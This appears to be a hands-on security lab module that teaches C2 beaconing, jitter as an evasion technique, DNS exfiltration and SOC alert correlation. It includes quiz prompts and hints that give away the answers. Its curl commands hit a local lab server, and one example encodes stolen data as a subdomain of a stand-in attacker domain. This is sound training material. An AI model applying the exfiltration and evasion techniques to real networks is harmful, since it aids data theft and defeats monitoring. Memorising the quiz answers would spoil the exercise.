title: C2 Detection and Evasion
description: Beacons with and without jitter, DNS exfiltration and alert correlation: play attacker and defender against the same traffic.

1.title: Beaconing: the metronome that betrays you
1.body:
## The beacon: the implant's heartbeat

An implant can't "call home" and sit there listening (that would make a
permanently suspicious socket). Instead it does **beaconing**:
periodic polling — "do you have orders for me?" every N seconds.

```bash
# Careless attacker: fixed 5s interval (a metronome)
curl -s "http://127.0.0.1:18103/beacon?id=implant1&interval=5"
curl -s "http://127.0.0.1:18103/beacon?id=implant1&interval=5"
curl -s "http://127.0.0.1:18103/beacon?id=implant1&interval=5"

# Defender's view:
curl -s http://127.0.0.1:18103/logs | jq '.beacons[].actual_delay'
# 5.0, 5.0, 5.0  ← three packets EXACTLY every 5 seconds
```

Human traffic is chaotic: emails that arrive in bursts, browsing
in bursts, silences. **Nothing human is periodic with clockwork
precision.** That perfect periodicity is the classic C2 signature that
exists — Splunk looks for it with standard-deviation queries over
time deltas per destination IP.

```bash
curl -s http://127.0.0.1:18103/detect | jq '.alerts[0]'
```

## Jitter: humanizing the metronome

Cobalt Strike, Sliver and every modern C2 accept `jitter`: a percentage
of random variation over the base interval. `5s + jitter 40%` →
each beacon lands between 3 and 7 seconds:

```bash
curl -s "http://127.0.0.1:18103/beacon-jitter?id=implant2&interval=5&jitter=40"
curl -s "http://127.0.0.1:18103/beacon-jitter?id=implant2&interval=5&jitter=40"
curl -s "http://127.0.0.1:18103/beacon-jitter?id=implant2&interval=5&jitter=40"

curl -s http://127.0.0.1:18103/logs | jq '[.beacons[] | select(.jitter>0) | .actual_delay]'
# [6.13, 3.87, 5.42]  ← no pattern
```

Run `/detect` again: the engine can't fingerprint what doesn't repeat.
The random variation destroys the statistic (the standard deviation
stops being ~0) and the beacon blends into normal traffic. That's why
modern detectors don't look for exact periodicity but for **statistical
regularity** (a low coefficient of variation over long windows), and
why a good defender also watches new domains, odd TLS JA3 fingerprints
and volumetry — not just timings.

**The dual lesson**: as a red teamer, a beacon without jitter gives you away within
hours; as a blue teamer, if your detection only fingerprints exact intervals,
the adversary evades you by adding a % of noise.

detection-evasion-t01-q01.prompt: Send 3+ beacons WITHOUT jitter (interval=5) and run /detect. What alert TYPE does the engine fire?
detection-evasion-t01-q01.hint: FIXED_INTERVAL_BEACON — the exact same interval across all of them is the signature

detection-evasion-t01-q02.prompt: Submit the flag the detector gives you for catching your 3 metronomic beacons.
detection-evasion-t01-q02.hint: curl 'http://127.0.0.1:18103/beacon?id=i1&interval=5' three times, then curl http://127.0.0.1:18103/detect

detection-evasion-t01-q03.prompt: Now send 3+ beacons WITH jitter=40 and check /detect again. What SEVERITY does the entry they generate have (LOW/HIGH/CRITICAL)?
detection-evasion-t01-q03.hint: With jitter the delays vary: the alert drops to informational because there's no fixed signature

2.title: DNS exfiltration and alert correlation
2.body:
## DNS: the tunnel nobody closed

The HTTP beacon goes out over port 80/443 to a weird IP — blockable. But
**DNS is mandatory** on any network: without name resolution there's no
internet. The attacker turns the resolver into its channel:

```bash
# Data encoded as a subdomain of an attacker-controlled domain:
#   <base64-data>.evil.example.com
curl -s "http://127.0.0.1:18103/dns?q=c3VwZXJzZWNyZXRkYXRhZXhmaWx0cmF0ZWQ.example.com" | jq .
```

The authoritative DNS server for `evil.example.com` (controlled by the
attacker) sees the "query" and decodes the subdomain: the data has already
left the network. Real-world tools: `dnscat2`, `iodine`, and even
plain `nslookup` by hand. The next room in the module (*Data
exfiltration: the DNS channel*) takes this channel all the way —
chunking, encoding and reassembling a whole secret —; here we focus on
what the defender needs to correlate.

The defender's signature: **abnormally long queries** (legitimate
subdomains rarely go past 25-30 chars), high label entropy, and
unusual volume of TXT/NULL queries toward the same domain.

## Correlation: from alerts to an incident

Isolated alerts are just noise. An incident is declared when several
signals **fit together**:

```bash
# 1. Generate the beaconing alert (3 beacons without jitter):
curl -s "http://127.0.0.1:18103/beacon?id=implant1&interval=5" >/dev/null
curl -s "http://127.0.0.1:18103/beacon?id=implant1&interval=5" >/dev/null
curl -s "http://127.0.0.1:18103/beacon?id=implant1&interval=5" >/dev/null

# 2. Add DNS exfiltration:
curl -s "http://127.0.0.1:18103/dns?q=c3VjcmV0b3NvcGVyYXRpdm9zLmV2aWwuZXhhbXBsZS5jb20=" >/dev/null

# 3. Correlate:
curl -s http://127.0.0.1:18103/detect | jq .
# "alerts": [FIXED_INTERVAL_BEACON, DNS_EXFIL], "correlated_attack": true
```

This is literally the daily job of a tier-2 SOC: the SIEM
(Splunk, Elastic, Sentinel) fires the individual rules, and the
analyst decides whether they **combine** into a case. Beaconing + anomalous DNS +
same time window = campaign, not coincidence.

## Containment playbook (what a real defender would do)

1. **Block the domain/IOCs** at the resolver (DNS sinkhole).
2. **Quarantine the host** that's beaconing (EDR isolation).
3. **Hunt retroactively**: did other hosts query that domain?
   (18 months of DNS logs, looking back).
4. **Eradicate the implant** and rotate the credentials it touched.

detection-evasion-t02-q01.prompt: Why is DNS such a popular exfiltration channel? Because firewalls almost always allow outbound DNS towards ___ (what?)
detection-evasion-t02-q01.hint: Any company server or the public resolver: UDP port 53 is open by default

detection-evasion-t02-q02.prompt: Exfiltrate data encoded in a long subdomain (over 30 characters) via /dns. Submit the flag.
detection-evasion-t02-q02.hint: curl 'http://127.0.0.1:18103/dns?q=c3VwZXJzZWNyZXRkYXRhZXhmaWx0cmF0ZWQ.example.com' — base64 of the data as the subdomain

detection-evasion-t02-q03.prompt: As the defender, generate enough suspicious traffic for /detect to cross 2+ alerts and flag correlated_attack. Submit the final flag.
detection-evasion-t02-q03.hint: Beacons without jitter (alert 1) + a long DNS query (CRITICAL alert) → /detect returns flag_if_detected
